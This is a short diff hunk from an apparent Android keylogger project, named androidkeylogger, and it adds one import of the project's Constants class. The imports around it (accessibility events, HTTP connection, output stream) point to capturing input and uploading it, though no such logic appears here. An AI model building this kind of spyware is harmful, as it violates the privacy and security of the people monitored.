@@ -6,6 +6,8 @@ import android.os.Build;
 import android.util.Log;
 import android.view.accessibility.AccessibilityEvent;
 
+import com.bshu2.androidkeylogger.Constants;
+
 import java.io.OutputStream;
 import java.net.HttpURLConnection;
 import java.net.URL;
